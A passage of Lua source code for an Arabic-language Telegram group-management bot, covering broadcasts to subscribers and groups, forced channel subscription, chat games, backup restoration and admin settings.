local list = Redis:smembers(LaRiCa.."ChekBotAdd") 
if msg.content.video_note then
for k,v in pairs(list) do 
LuaTele.sendVideoNote(v, 0, msg.content.video_note.video.remote.id)
Redis:set(LaRiCa.."LaRiCa:PinMsegees:"..v,msg.content.video_note.video.remote.id)
end
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
for k,v in pairs(list) do 
LuaTele.sendPhoto(v, 0, idPhoto,'')
Redis:set(LaRiCa.."LaRiCa:PinMsegees:"..v,idPhoto)
end
elseif msg.content.sticker then 
for k,v in pairs(list) do 
LuaTele.sendSticker(v, 0, msg.content.sticker.sticker.remote.id)
Redis:set(LaRiCa.."LaRiCa:PinMsegees:"..v,msg.content.sticker.sticker.remote.id)
end
elseif msg.content.voice_note then 
for k,v in pairs(list) do 
LuaTele.sendVoiceNote(v, 0, msg.content.voice_note.voice.remote.id, '', 'md')
Redis:set(LaRiCa.."LaRiCa:PinMsegees:"..v,msg.content.voice_note.voice.remote.id)
end
elseif msg.content.video then 
for k,v in pairs(list) do 
LuaTele.sendVideo(v, 0, msg.content.video.video.remote.id, '', "md")
Redis:set(LaRiCa.."LaRiCa:PinMsegees:"..v,msg.content.video.video.remote.id)
end
elseif msg.content.animation then 
for k,v in pairs(list) do 
LuaTele.sendAnimation(v,0, msg.content.animation.animation.remote.id, '', 'md')
Redis:set(LaRiCa.."LaRiCa:PinMsegees:"..v,msg.content.animation.animation.remote.id)
end
elseif msg.content.document then
for k,v in pairs(list) do 
LuaTele.sendDocument(v, 0, msg.content.document.document.remote.id, '', 'md')
Redis:set(LaRiCa.."LaRiCa:PinMsegees:"..v,msg.content.document.document.remote.id)
end
elseif msg.content.audio then
for k,v in pairs(list) do 
LuaTele.sendAudio(v, 0, msg.content.audio.audio.remote.id, '', "md") 
Redis:set(LaRiCa.."LaRiCa:PinMsegees:"..v,msg.content.audio.audio.remote.id)
end
elseif text then
for k,v in pairs(list) do 
LuaTele.sendText(v,0,text,"md",true)
Redis:set(LaRiCa.."LaRiCa:PinMsegees:"..v,text)
end
end
LuaTele.sendText(msg_chat_id,msg_id,"• تمت الاذاعه الى*- "..#list.."* مجموعه في البوت ","md",true)      
Redis:del(LaRiCa.."LaRiCa:Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return false
end

if Redis:get(LaRiCa.."Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء •' then   
Redis:del(LaRiCa.."Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id, "\n• تم الغاء الاذاعه بالتوجيه للخاص","md",true)    
end 
if msg.forward_info then 
local list = Redis:smembers(LaRiCa.."Num:User:Pv") 
LuaTele.sendText(msg_chat_id,msg_id,"• تم التوجيه الى*- "..#list.."* مشترك ف البوت ","md",true)      
for k,v in pairs(list) do  
LuaTele.forwardMessages(v, msg_chat_id, msg_id,0,0,true,false,false)
end   
Redis:del(LaRiCa.."Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
end 
return false
end
if Redis:get(LaRiCa.."Broadcasting:Users" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء •' then   
Redis:del(LaRiCa.."Broadcasting:Users" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id, "\n• تم الغاء الاذاعه للخاص","md",true)  
end 
local list = Redis:smembers(LaRiCa.."Num:User:Pv") 
if msg.content.video_note then
for k,v in pairs(list) do 
LuaTele.sendVideoNote(v, 0, msg.content.video_note.video.remote.id)
end
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
for k,v in pairs(list) do 
LuaTele.sendPhoto(v, 0, idPhoto,'')
end
elseif msg.content.sticker then 
for k,v in pairs(list) do 
LuaTele.sendSticker(v, 0, msg.content.sticker.sticker.remote.id)
end
elseif msg.content.voice_note then 
for k,v in pairs(list) do 
LuaTele.sendVoiceNote(v, 0, msg.content.voice_note.voice.remote.id, '', 'md')
end
elseif msg.content.video then 
for k,v in pairs(list) do 
LuaTele.sendVideo(v, 0, msg.content.video.video.remote.id, '', "md")
end
elseif msg.content.animation then 
for k,v in pairs(list) do 
LuaTele.sendAnimation(v,0, msg.content.animation.animation.remote.id, '', 'md')
end
elseif msg.content.document then
for k,v in pairs(list) do 
LuaTele.sendDocument(v, 0, msg.content.document.document.remote.id, '', 'md')
end
elseif msg.content.audio then
for k,v in pairs(list) do 
LuaTele.sendAudio(v, 0, msg.content.audio.audio.remote.id, '', "md") 
end
elseif text then   
for k,v in pairs(list) do 
LuaTele.sendText(v,0, "*"..text.."*","md",true)  
end
end
LuaTele.sendText(msg_chat_id,msg_id,"• تمت الاذاعه الى*- "..#list.."* عضو في البوت ","md",true)      
Redis:del(LaRiCa.."Broadcasting:Users" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return false
end
if Redis:get(LaRiCa.."Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء •' then   
Redis:del(LaRiCa.."Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id, "\n• تم الغاء الاذاعه للمجموعات","md",true)  
end 
local list = Redis:smembers(LaRiCa.."ChekBotAdd") 
if msg.content.video_note then
for k,v in pairs(list) do 
LuaTele.sendVideoNote(v, 0, msg.content.video_note.video.remote.id)
end
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
for k,v in pairs(list) do 
LuaTele.sendPhoto(v, 0, idPhoto,'')
end
elseif msg.content.sticker then 
for k,v in pairs(list) do 
LuaTele.sendSticker(v, 0, msg.content.sticker.sticker.remote.id)
end
elseif msg.content.voice_note then 
for k,v in pairs(list) do 
LuaTele.sendVoiceNote(v, 0, msg.content.voice_note.voice.remote.id, '', 'md')
end
elseif msg.content.video then 
for k,v in pairs(list) do 
LuaTele.sendVideo(v, 0, msg.content.video.video.remote.id, '', "md")
end
elseif msg.content.animation then 
for k,v in pairs(list) do 
LuaTele.sendAnimation(v,0, msg.content.animation.animation.remote.id, '', 'md')
end
elseif msg.content.document then
for k,v in pairs(list) do 
LuaTele.sendDocument(v, 0, msg.content.document.document.remote.id, '', 'md')
end
elseif msg.content.audio then
for k,v in pairs(list) do 
LuaTele.sendAudio(v, 0, msg.content.audio.audio.remote.id, '', "md") 
end
elseif text then   
for k,v in pairs(list) do 
LuaTele.sendText(v,0, "*"..text.."*","md",true)  
end
end
LuaTele.sendText(msg_chat_id,msg_id,"• تمت الاذاعه الى*- "..#list.."* كروب في البوت ","md",true)      
Redis:del(LaRiCa.."Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return false
end
------------------------------------------------------------------------------------------------------------
if text and Redis:get(LaRiCa.."chmembers") == "on" then
if ChannelJoin(msg) == false then
local UserInfo = LuaTele.getUser(msg.sender.user_id)
local n = UserInfo.first_name
local d = UserInfo.id
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
LuaTele.deleteMessages(msg.chat_id,{[1]= msg_id})
LuaTele.sendText(msg.chat_id,0,'• عذا يا ['..n..']('..d..') \n• عليك الاشتراك في قناه البوت للتمكن من التحدث هنا\n',"md",false, false, false, false, reply_markup)
return false 
end 
end
if Redis:get(LaRiCa.."Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء •' then   
Redis:del(LaRiCa.."Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id, "\n• تم الغاء الاذاعه بالتوجيه للمجموعات","md",true)    
end 
if msg.forward_info then 
local list = Redis:smembers(LaRiCa.."ChekBotAdd")   
LuaTele.sendText(msg_chat_id,msg_id,"• تم التوجيه الى*- "..#list.."* كروب في البوت ","md",true)      
for k,v in pairs(list) do  
LuaTele.forwardMessages(v, msg_chat_id, msg_id,0,0,true,false,false)
end   
Redis:del(LaRiCa.."Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
end 
return false
end
if text and Redis:get(LaRiCa..'GetTexting:DevLaRiCa'..msg_chat_id..':'..msg.sender.user_id) then
if text == 'الغاء' or text == 'الغاء •' then 
Redis:del(LaRiCa..'GetTexting:DevLaRiCa'..msg_chat_id..':'..msg.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,'• تم الغاء حفظ كليشة المطور')
end
Redis:set(LaRiCa..'Texting:DevLaRiCa',text)
Redis:del(LaRiCa..'GetTexting:DevLaRiCa'..msg_chat_id..':'..msg.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,'• تم حفظ كليشة المطور')
end
if Redis:get(LaRiCa.."Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id) then 
if text == 'الغاء' then 
LuaTele.sendText(msg_chat_id,msg_id, "\n• تم الغاء امر تعين الايدي عام","md",true)  
Redis:del(LaRiCa.."Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id) 
return false  
end 
Redis:del(LaRiCa.."Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id) 
Redis:set(LaRiCa.."Set:Id:Groups",text:match("(.*)"))
LuaTele.sendText(msg_chat_id,msg_id,'• تم تعين الايدي عام',"md",true)  
end
if Redis:get(LaRiCa.."Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id) then 
if text == 'الغاء' then 
LuaTele.sendText(msg_chat_id,msg_id, "\n• تم الغاء امر تعين الايدي","md",true)  
Redis:del(LaRiCa.."Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id) 
return false  
end 
Redis:del(LaRiCa.."Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id) 
Redis:set(LaRiCa.."Set:Id:Group"..msg.chat_id,text:match("(.*)"))
LuaTele.sendText(msg_chat_id,msg_id,'• تم تعين الايدي الجديد',"md",true)  
end
if Redis:get(LaRiCa.."Change:Name:Bot"..msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء •' then   
Redis:del(LaRiCa.."Change:Name:Bot"..msg.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id, "\n• تم الغاء امر تغيير اسم البوت","md",true)  
end 
Redis:del(LaRiCa.."Change:Name:Bot"..msg.sender.user_id) 
Redis:set(LaRiCa.."Name:Bot",text) 
return LuaTele.sendText(msg_chat_id,msg_id, "• تم تغيير اسم البوت الى - "..text,"md",true)    
end 
if Redis:get(LaRiCa.."Change:Start:Bot"..msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء •' then   
Redis:del(LaRiCa.."Change:Start:Bot"..msg.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id, "\n• تم الغاء امر تغيير كليشه start","md",true)  
end 
Redis:del(LaRiCa.."Change:Start:Bot"..msg.sender.user_id) 
Redis:set(LaRiCa.."Start:Bot",text) 
return LuaTele.sendText(msg_chat_id,msg_id, "• تم تغيير كليشه start - "..text,"md",true)    
end 
if Redis:get(LaRiCa.."Game:Smile"..msg.chat_id) then
if text == Redis:get(LaRiCa.."Game:Smile"..msg.chat_id) then
Redis:incrby(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
Redis:del(LaRiCa.."Game:Smile"..msg.chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,"\n• لقد فزت في اللعبه \n• العب مره اخره وارسل - سمايل او سمايلات","md",true)  
end
end 
if Redis:get(LaRiCa.."mshaher"..msg.chat_id) then
if text == Redis:get(LaRiCa.."mshaher"..msg.chat_id) then
Redis:del(LaRiCa.."mshaher"..msg.chat_id)
Redis:incrby(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
return LuaTele.sendText(msg_chat_id,msg_id,"\n• لقد فزت في اللعبه \n• العب مره اخره وارسل - شخصيات او مشاهير","md",true)  
end
end 
if Redis:get(LaRiCa.."Game:Monotonous"..msg.chat_id) then
if text == Redis:get(LaRiCa.."Game:Monotonous"..msg.chat_id) then
Redis:del(LaRiCa.."Game:Monotonous"..msg.chat_id)
Redis:incrby(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
return LuaTele.sendText(msg_chat_id,msg_id,"\n• لقد فزت في اللعبه \n• العب مره اخره وارسل - الاسرع او ترتيب","md",true)  
end
end 
if Redis:get(LaRiCa.."Game:Riddles"..msg.chat_id) then
if text == Redis:get(LaRiCa.."Game:Riddles"..msg.chat_id) then
Redis:incrby(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
Redis:del(LaRiCa.."Game:Riddles"..msg.chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,"\n• لقد فزت في اللعبه \n• العب مره اخره وارسل - حزوره","md",true)  
end
end
if Redis:get(LaRiCa.."Game:Meaningof"..msg.chat_id) then
if text == Redis:get(LaRiCa.."Game:Meaningof"..msg.chat_id) then
Redis:incrby(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
Redis:del(LaRiCa.."Game:Meaningof"..msg.chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,"\n• لقد فزت في اللعبه \n• العب مره اخره وارسل - معاني","md",true)  
end
end
if Redis:get(LaRiCa.."Game:enkliz"..msg.chat_id) then
if text == Redis:get(LaRiCa.."Game:enkliz"..msg.chat_id) then
Redis:incrby(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
Redis:del(LaRiCa.."Game:enkliz"..msg.chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,"\n• لقد فزت في اللعبه \n• العب مره اخره وارسل - انجليزي","md",true)  
end
end
if Redis:get(LaRiCa.."Game:Countrygof"..msg.chat_id) then
if text == Redis:get(LaRiCa.."Game:Countrygof"..msg.chat_id) then
Redis:incrby(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
Redis:del(LaRiCa.."Game:Countrygof"..msg.chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,"\n• لقد فزت في اللعبه \n• العب مره اخره وارسل - اعلام","md",true)  
end
end
if Redis:get(LaRiCa.."Game:Reflection"..msg.chat_id) then
if text == Redis:get(LaRiCa.."Game:Reflection"..msg.chat_id) then
Redis:incrby(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
Redis:del(LaRiCa.."Game:Reflection"..msg.chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,"\n• لقد فزت في اللعبه \n• العب مره اخره وارسل - العكس","md",true)  
end
end
if Redis:get(LaRiCa.."Game:Estimate"..msg.chat_id..msg.sender.user_id) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
return LuaTele.sendText(msg_chat_id,msg_id,"• عذرآ لا يمكنك تخمين عدد اكبر من ال { 20 } خمن رقم ما بين ال{ 1 و 20 }\n","md",true)  
end 
local GETNUM = Redis:get(LaRiCa.."Game:Estimate"..msg.chat_id..msg.sender.user_id)
if tonumber(NUM) == tonumber(GETNUM) then
Redis:del(LaRiCa.."SADD:NUM"..msg.chat_id..msg.sender.user_id)
Redis:del(LaRiCa.."Game:Estimate"..msg.chat_id..msg.sender.user_id)
Redis:incrby(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id,5)  
return LuaTele.sendText(msg_chat_id,msg_id,"• مبروك فزت ويانه وخمنت الرقم الصحيح\n🚸︙تم اضافة { 5 } من النقاط \n","md",true)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
Redis:incrby(LaRiCa.."SADD:NUM"..msg.chat_id..msg.sender.user_id,1)
if tonumber(Redis:get(LaRiCa.."SADD:NUM"..msg.chat_id..msg.sender.user_id)) >= 3 then
Redis:del(LaRiCa.."SADD:NUM"..msg.chat_id..msg.sender.user_id)
Redis:del(LaRiCa.."Game:Estimate"..msg.chat_id..msg.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• اوبس لقد خسرت في اللعبه \n• حظآ اوفر في المره القادمه \n• كان الرقم الذي تم تخمينه { "..GETNUM.." }","md",true)  
else
return LuaTele.sendText(msg_chat_id,msg_id,"• اوبس تخمينك غلط \n• ارسل رقم تخمنه مره اخرى ","md",true)  
end
end
end
end
if Redis:get(LaRiCa.."Game:Difference"..msg.chat_id) then
if text == Redis:get(LaRiCa.."Game:Difference"..msg.chat_id) then 
Redis:del(LaRiCa.."Game:Difference"..msg.chat_id)
Redis:incrby(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
return LuaTele.sendText(msg_chat_id,msg_id,"\n• لقد فزت في اللعبه \n• العب مره اخره وارسل - المختلف","md",true)  
end
end
if Redis:get(LaRiCa.."Game:Example"..msg.chat_id) then
if text == Redis:get(LaRiCa.."Game:Example"..msg.chat_id) then 
Redis:del(LaRiCa.."Game:Example"..msg.chat_id)
Redis:incrby(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
return LuaTele.sendText(msg_chat_id,msg_id,"\n• لقد فزت في اللعبه \n• العب مره اخره وارسل - امثله","md",true)  
end
end
if text then
local NewCmmd = Redis:get(LaRiCa.."All:Get:Reides:Commands:Group"..text) or Redis:get(LaRiCa.."Get:Reides:Commands:Group"..msg_chat_id..":"..text)
if NewCmmd then
text = (NewCmmd or text)
end
end
if Redis:get(LaRiCa.."ch:addd"..msg.sender.user_id) == "on" then
Redis:set(LaRiCa.."ch:addd"..msg.sender.user_id,"off")
local m = https.request("http://api.telegram.org/bot"..Token.."/getchat?chat_id="..text)
data = json:decode(m)
if data.result.invite_link then
local ch = data.result.id
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '1', data = msg.sender.user_id..'/setallmember'}, {text = '2', data = msg.sender.user_id..'/setforcmd'}, },}}
LuaTele.sendText(msg_chat_id,msg_id,'• تم حفظ القناه \n• اختار كيف تريد تفعيله \n• 1 : وضع الاشتراك الاجباري لكل الاعضاء \n• 2 : وضع الاشتراك الاجباري عند استخدام الاوامر فقط \n',"md",false, false, false, false, reply_markup)
Redis:del(LaRiCa.."chfalse")
Redis:set(LaRiCa.."chfalse",ch)
Redis:del(LaRiCa.."ch:admin")
Redis:set(LaRiCa.."ch:admin",data.result.invite_link)
else
LuaTele.sendText(msg_chat_id,msg_id,'• المعرف خطأ او البوت ليس مشرف في القناه ',"md",true)  
end
end
if Redis:get(LaRiCa.."ch:addd"..msg.sender.user_id) == "on" then
Redis:set(LaRiCa.."ch:addd"..msg.sender.user_id,"off")
local m = https.request("http://api.telegram.org/bot"..Token.."/getchat?chat_id="..text)
data = json:decode(m)
if data.result.invite_link then
local ch = data.result.id
LuaTele.sendText(msg_chat_id,msg_id,'• تم حفظ القناه ',"md",true)  
Redis:del(LaRiCa.."chfalse")
Redis:set(LaRiCa.."chfalse",ch)
Redis:del(LaRiCa.."ch:admin")
Redis:set(LaRiCa.."ch:admin",data.result.invite_link)
else
LuaTele.sendText(msg_chat_id,msg_id,'• المعرف خطأ او البوت ليس مشرف في القناه ',"md",true)  
end
end

if text == 'رفع النسخه الاحتياطيه' and msg.reply_to_message_id ~= 0 or text == 'رفع نسخه احتياطيه' and msg.reply_to_message_id ~= 0 then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if Message_Reply.content.document then
local File_Id = Message_Reply.content.document.document.remote.id
local Name_File = Message_Reply.content.document.file_name
if Name_File ~= UserBot..'.json' then
return LuaTele.sendText(msg_chat_id,msg_id,'• عذرا هاذا الملف غير مطابق مع البوت يرجى جلب النسخه الحقيقيه')
end -- end Namefile
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..File_Id)) 
local download_ = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,''..Name_File) 
local Get_Info = io.open(download_,"r"):read('*a')
local FilesJson = JSON.decode(Get_Info)
if tonumber(LaRiCa) ~= tonumber(FilesJson.BotId) then
return LuaTele.sendText(msg_chat_id,msg_id,'• عذرا هاذا الملف غير مطابق مع البوت يرجى جلب النسخه الحقيقيه')
end -- end botid
LuaTele.sendText(msg_chat_id,msg_id,'• جاري استرجاع المشتركين والكروبات ...')
Y = 0
for k,v in pairs(FilesJson.UsersBot) do
Y = Y + 1
Redis:sadd(LaRiCa..'Num:User:Pv',v)  
end
X = 0
for GroupId,ListGroup in pairs(FilesJson.GroupsBot) do
X = X + 1
Redis:sadd(LaRiCa.."ChekBotAdd",GroupId) 
if ListGroup.President then
for k,v in pairs(ListGroup.President) do
Redis:sadd(LaRiCa.."Supcreator:Group"..GroupId,v)
end
end
if ListGroup.Constructor then
for k,v in pairs(ListGroup.Constructor) do
Redis:sadd(LaRiCa.."Creator:Group"..GroupId,v)
end
end
if ListGroup.Manager then
for k,v in pairs(ListGroup.Manager) do
Redis:sadd(LaRiCa.."Manger:Group"..GroupId,v)
end
end
if ListGroup.Admin then
for k,v in pairs(ListGroup.Admin) do
Redis:sadd(LaRiCa.."Admin:Group"..GroupId,v)
end
end
if ListGroup.Vips then
for k,v in pairs(ListGroup.Vips) do
Redis:sadd(LaRiCa.."Special:Group"..GroupId,v)
end
end 
end
return LuaTele.sendText(msg_chat_id,msg_id,'• تم استرجاع {'..X..'} كروب \n• واسترجاع {'..Y..'} مشترك في البوت')
end
end
if text == 'رفع نسخه تشاكي' and msg.reply_to_message_id ~= 0 then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if Message_Reply.content.document then
local File_Id = Message_Reply.content.document.document.remote.id
local Name_File = Message_Reply.content.document.file_name
if tonumber(Name_File:match('(%d+)')) ~= tonumber(LaRiCa) then 
return LuaTele.sendText(msg_chat_id,msg_id,'• عذرا هاذا الملف غير مطابق مع البوت يرجى جلب النسخه الحقيقيه')
end -- end Namefile
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..File_Id)) 
local download_ = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,''..Name_File) 
local Get_Info = io.open(download_,"r"):read('*a')
local All_Groups = JSON.decode(Get_Info)
if All_Groups.GP_BOT then
for idg,v in pairs(All_Groups.GP_BOT) do
Redis:sadd(LaRiCa.."ChekBotAdd",idg) 
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
Redis:sadd(LaRiCa.."Creator:Group"..idg,idmsh)
end;end
if v.MDER then
for k,idmder in pairs(v.MDER) do
Redis:sadd(LaRiCa.."Manger:Group"..idg,idmder)  
end;end
if v.MOD then
for k,idmod in pairs(v.MOD) do
Redis:sadd(LaRiCa.."Admin:Group"..idg,idmod)
end;end
if v.ASAS then
for k,idASAS in pairs(v.ASAS) do
Redis:sadd(LaRiCa.."Supcreator:Group"..idg,idASAS)
end;end
end
return LuaTele.sendText(msg_chat_id,msg_id,'• تم استرجاع المجموعات من نسخه تشاكي')
else
return LuaTele.sendText(msg_chat_id,msg_id,'• الملف لا يدعم هاذا البوت')
end
end
end

if text == 'تعطيل الاذاعه •' or text == 'تعطيل الاذاعه' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."SendBcBot") 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل الاذاعه ","md",true)
end
if text == 'تفعيل الاذاعه •' or text == 'تفعيل الاذاعه' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."SendBcBot",true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل الاذاعه للمطورين ","md",true)
end
if text == 'تعطيل المغادره •' or text == 'تعطيل المغادره' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."LeftBot") 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل المغادره ","md",true)
end
if text == 'تفعيل المغادره •' or text == 'تفعيل المغادره' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."LeftBot",true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل المغادره للمطورين ","md",true)
end
if (Redis:get(LaRiCa.."AddSudosNew"..msg_chat_id) == 'true') then
if text == "الغاء" or text == 'الغاء •' then   
Redis:del(LaRiCa.."AddSudosNew"..msg_chat_id)
return LuaTele.sendText(msg_chat_id,msg_id, "\n• تم الغاء امر تغيير المطور الاساسي","md",true)    
end 
Redis:del(LaRiCa.."AddSudosNew"..msg_chat_id)
if text and text:match("^@[%a%d_]+$") then
local UserId_Info = LuaTele.searchPublicChat(text)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
local Informationlua = io.open("Information.lua", 'w')
Informationlua:write([[
return {
Token = "]]..Token..[[",
UserBot = "]]..UserBot..[[",
UserSudo = "]]..text:gsub('@','')..[[",
SudoId = ]]..UserId_Info.id..[[
}
]])
Informationlua:close()
LuaTele.sendText(msg_chat_id,msg_id,"\n• تم تغيير المطور الاساسي اصبح على : [@"..text:gsub('@','').."]","md",true)  
dofile('LaRiCa.lua')  
end
end
if text == 'تغيير المطور الاساسي' or text == 'تغيير المطور الاساسي •' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
Redis:set(LaRiCa.."AddSudosNew"..msg_chat_id,true)
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل معرف المطور الاساسي مع @","md",true)
end
---------------اذاعة-----------------
if text == 'اذاعه بالتوجيه •' or text == 'اذاعه بالتوجيه' then 
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(3)..'* ',"md",true)  
end
if not msg.ControllerBot and not Redis:set(LaRiCa.."SendBcBot") then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• امر المغادره معطل من قبل الاساسي ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
